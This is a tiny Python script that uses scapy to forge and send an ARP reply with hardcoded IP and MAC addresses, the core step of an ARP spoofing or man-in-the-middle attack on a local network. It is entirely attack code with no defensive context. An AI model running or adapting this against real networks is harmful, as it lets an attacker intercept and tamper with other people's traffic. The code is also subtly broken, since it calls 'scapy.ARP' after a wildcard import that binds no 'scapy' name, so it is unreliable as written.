from scapy.all import *


def spoofing():
    packet = scapy.ARP(op=2, hwdst="30:89:4A:D2:5A:AA", pdst="10.33.73.72", psrc="10.33.73.77", hwsrc="98:8D:46:C4:FA:E5")
    scapy.send(packet, verbose=False)